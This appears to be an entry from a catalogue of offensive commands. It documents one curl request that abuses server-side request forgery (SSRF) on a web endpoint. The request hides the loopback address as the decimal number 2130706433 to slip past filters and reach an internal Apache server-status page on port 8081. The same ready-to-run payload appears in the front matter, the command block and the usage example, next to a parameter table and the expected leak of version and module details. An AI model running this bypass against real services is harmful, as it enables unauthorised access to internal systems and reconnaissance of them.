---
data: >-
  curl -X POST -d 'url=http://2130706433:8081/server-status'
  https://www.apitest.io/request
tags:
  - ssrf
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.428Z'
id: e5eec4bf-7760-4726-bc7c-7ab7b8a453a2
verified: false
validated: true
submitted: true
---
# curl-ssrf-ip-bypass-dword

## Command

```bash
curl -X POST -d 'url=http://2130706433:8081/server-status' https://www.apitest.io/request
```

## Description

Bypasses using DWORD (decimal) IP encoding for SSRF to Apache status.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d 'url=...'` | DWORD-encoded URL | Yes |
| `https://www.apitest.io/request` | Endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'url=http://2130706433:8081/server-status' https://www.apitest.io/request
```

## Expected Output

Apache version and modules details.

## Related

- [[Related Procedure]]
